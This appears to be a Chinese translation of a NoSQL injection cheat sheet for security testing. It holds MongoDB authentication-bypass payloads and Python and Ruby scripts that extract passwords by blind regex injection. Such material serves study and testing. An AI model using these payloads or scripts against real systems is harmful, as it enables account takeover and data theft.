[README.en.md](README.en.md)

# NoSQL 注入

> NoSQL 数据库提供的松散一致性约束比传统 SQL 数据库更少。通过需要更少的关系约束和一致性检查，NoSQL 数据库通常提供性能和扩展性优势。然而，这些数据库仍然可能容易受到注入攻击的影响，即使它们不使用传统的 SQL 语法。

## 摘要

* [工具](#tools)
* [方法](#methodology)
    * [操作符注入](#operator-injection)
    * [身份验证绕过](#authentication-bypass)
    * [提取长度信息](#extract-length-information)
    * [提取数据信息](#extract-data-information)
    * [WAF 和过滤器](#waf-and-filters)
* [盲注 NoSQL](#blind-nosql)
    * [带 JSON 体的 POST](#post-with-json-body)
    * [带 urlencoded 体的 POST](#post-with-urlencoded-body)
    * [GET](#get)
* [实验室](#references)
* [参考资料](#references)

## 工具

* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - 自动化的 NoSQL 数据库枚举和 Web 应用程序利用工具
* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - 用于玩弄 NoSQL 注入的实验室
* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - 该扩展提供发现 NoSQL 注入漏洞的方法。

## 方法

当攻击者通过将恶意输入注入到 NoSQL 数据库查询中来操纵查询时，就会发生 NoSQL 注入。与 SQL 注入不同，NoSQL 注入通常利用基于 JSON 的查询和 MongoDB 中的操作符，如 `$ne`、`$gt`、`$regex` 或 `$where`。

### 操作符注入

| 操作符 | 描述        |
| -------- | ------------------ |
| $ne      | 不等于          |
| $regex   | 正则表达式 |
| $gt      | 大于       |
| $lt      | 小于         |
| $nin     | 不在             |

示例：一个 Web 应用程序具有产品搜索功能

```js
db.products.find({ "price": userInput })
```

攻击者可以注入 NoSQL 查询：`{ "$gt": 0 }`。

```js
db.products.find({ "price": { "$gt": 0 } })
```

数据库返回价格大于零的所有产品而不是特定产品，从而泄露数据。

### 身份验证绕过

使用不等于（`$ne`）或大于（`$gt`）的基本身份验证绕过

* HTTP 数据

  ```ps1
  username[$ne]=toto&password[$ne]=toto
  login[$regex]=a.*&pass[$ne]=lol
  login[$gt]=admin&login[$lt]=test&pass[$ne]=1
  login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
  ```

* JSON 数据

  ```json
  {"username": {"$ne": null}, "password": {"$ne": null}}
  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
  {"username": {"$gt":""}, "password": {"$gt":""}}
  ```

### 提取长度信息

使用 $regex 操作符注入负载。当长度正确时，注入将生效。

```ps1
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### 提取数据信息

使用"`$regex`"查询操作符提取数据。

* HTTP 数据

  ```ps1
  username[$ne]=toto&password[$regex]=m.{2}
  username[$ne]=toto&password[$regex]=md.{1}
  username[$ne]=toto&password[$regex]=mdp

  username[$ne]=toto&password[$regex]=m.*
  username[$ne]=toto&password[$regex]=md.*
  ```

* JSON 数据

  ```json
  {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
  {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
  ```

使用"`$in`"查询操作符提取数据。

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### WAF 和过滤器

**移除先决条件**:

在 MongoDB 中，如果文档包含重复键，只有键的最后一次出现将优先。

```js
{"id":"10", "id":"100"} 
```

在这种情况下，"id" 的最终值将是"100"。

## 盲注 NoSQL

### 带 JSON 体的 POST

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### 带 urlencoded 体的 POST

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

Python 脚本：

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c
```

Ruby 脚本：

```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # 所有 ASCII 可打印字符
CHARSET = [*'0'..'9',*'a'..'z','-'] # 字母数字 + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end
```

## 实验室

* [Root Me - NoSQL 注入 - 身份验证](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
* [Root Me - NoSQL 注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)

## 参考资料

* [Burp-NoSQLiScanner - matrix - 2021年1月30日](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
* [摆脱 NoSQL 注入中的前条件和后条件 - Reino Mostert - 2025年3月11日](https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
* [经典和盲注 NOSQL 注入：永远不要相信用户输入 - Geluchat - 2015年2月22日](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
* [带有聚合管道的 MongoDB NoSQL 注入 - Soroush Dalili (@irsdl) - 2024年6月23日](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
* [基于错误的 NoSQL 注入 - Reino Mostert - 2025年3月15日](https://sensepost.com/blog/2025/nosql-error-based-injection/)
* [MongoDB 中的 NoSQL 注入 - Zanon - 2016年7月17日](https://zanon.io/posts/nosql-injection-in-mongodb)
* [NoSQL 注入单词列表 - cr0hn - 2021年5月5日](https://github.com/cr0hn/nosqlinjection_wordlists)
* [测试 NoSQL 注入 - OWASP - 2023年5月2日](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)